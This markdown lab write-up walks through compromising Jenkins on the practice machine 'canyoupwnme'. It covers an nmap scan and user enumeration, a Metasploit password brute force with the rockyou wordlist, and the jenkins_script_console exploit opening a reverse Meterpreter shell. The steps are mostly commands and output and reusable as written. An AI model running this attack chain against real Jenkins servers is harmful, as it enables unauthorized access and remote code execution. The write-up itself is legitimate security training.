# Jenkins

## Port scanning to identify Jenkins

Let's scan the target machine (`canyoupwnme`) with `nmap`

    $ nmap -A -T4 -sT -p1-65535 canyoupwnme
    ...
    9000/tcp  open  http        Jetty winstone-2.9
    |_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    | http-robots.txt: 1 disallowed entry
    |_/
    |_http-server-header: Jetty(winstone-2.9)
    |_http-title: Dashboard [Jenkins]
    ...

Jenkins is reachable on port `9000`!

## Information gathering

Typically, Jenkins exposes an endpoint (`/people` or `/asynchPeople`) that
does not require authentication and where all the defined users are listed.
Just to be sure, we can use `jenkins_enum` auxiliary

    msf > use auxiliary/scanner/http/jenkins_enum
    msf auxiliary(jenkins_enum) > set rhosts canyoupwnme
    msf auxiliary(jenkins_enum) > set rport 9000
    msf auxiliary(jenkins_enum) > set targeturi /
    msf auxiliary(jenkins_enum) > exploit

    [*] 10.0.100.195:9000 - Jenkins Version - 1.647
    [*] 10.0.100.195:9000 - /script restricted (403)
    [*] 10.0.100.195:9000 - /view/All/newJob restricted (403)
    [+] 10.0.100.195:9000 - /asynchPeople/ does not require authentication (200)
    [*] 10.0.100.195:9000 - /systemInfo restricted (403)
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

According to `/asynchPeople`, users defined in the target machine are

*   admin (Jarvis)
*   anonymous (anonymous)

After trying the login with few terrible combinations (e.g. `admin/admin`),
let's see if Metasploit can help us

    msf > search jenkins

    Matching Modules
    ================

       Name                                         Disclosure Date  Rank       Description
       ----                                         ---------------  ----       -----------
       auxiliary/gather/jenkins_cred_recovery                        normal     Jenkins Domain Credential Recovery
       auxiliary/scanner/http/jenkins_enum                           normal     Jenkins Enumeration
       auxiliary/scanner/http/jenkins_login                          normal     Jenkins-CI Login Utility
       exploit/linux/misc/jenkins_java_deserialize  2015-11-18       excellent  Jenkins CLI RMI Java Deserialization Vulnerability
       exploit/multi/http/jenkins_script_console    2013-01-18       good       Jenkins Script-Console Java Execution

Let's try with `auxiliary/scanner/http/jenkins_login` and Rockyou wordlist

    msf > use auxiliary/scanner/http/jenkins_login
    msf auxiliary(jenkins_login) > set username admin
    msf auxiliary(jenkins_login) > set pass_file rockyou.txt
    msf auxiliary(jenkins_login) > set rhosts canyoupwnme
    msf auxiliary(jenkins_login) > set rport 9000
    msf auxiliary(jenkins_login) > set stop_on_success true
    msf auxiliary(jenkins_login) > exploit

    [-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:123456 (Incorrect)
    [-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:12345 (Incorrect)
    [-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:123456789 (Incorrect)
    ...
    [-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:flower (Incorrect)
    [-] 10.0.100.195:9000 JENKINS - LOGIN FAILED: admin:playboy (Incorrect)
    [+] 10.0.100.195:9000 - LOGIN SUCCESSFUL: admin:hello
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Yep! Credentials are `admin/hello`...

## The Groovy scripts

Two years ago, I read an interesting post entitled
[How I hacked Facebook](http://blog.dewhurstsecurity.com/2014/12/09/how-i-hacked-facebook.html).
It refers to an unprotected Jenkins instance where the author used a Groovy
script to execute some commands on the server. Why not trying the same? In the
previous Metasploit search, there is something interesting

    exploit/multi/http/jenkins_script_console

Let's try with it...

    msf > use exploit/multi/http/jenkins_script_console
    msf exploit(jenkins_script_console) > set username admin
    msf exploit(jenkins_script_console) > set password hello
    msf exploit(jenkins_script_console) > set rhost canyoupwnme
    msf exploit(jenkins_script_console) > set rport 9000
    msf exploit(jenkins_script_console) > set targeturi /
    msf exploit(jenkins_script_console) > set target 1
    msf exploit(jenkins_script_console) > exploit

    [*] Started reverse TCP handler on 10.0.100.245:4444
    [*] Checking access to the script console
    [*] Logging in...
    [*] canyoupwnme:9000 - Sending Linux stager...
    [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
    [*] Sending stage (1495599 bytes) to 10.0.100.195
    [*] Meterpreter session 2 opened (10.0.100.245:4444 -> 10.0.100.195:44531) at 2016-04-18 18:13:30 +0200
    [!] Deleting /tmp/AaqyV payload file

    meterpreter > shell
    Process 1840 created.
    Channel 1 created.
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    jenkins
    $ id
    uid=109(jenkins) gid=117(jenkins) groups=117(jenkins)
    $

## Becoming `root`

See "Becoming `root`" section in [Tomcat](./001-tomcat.md).
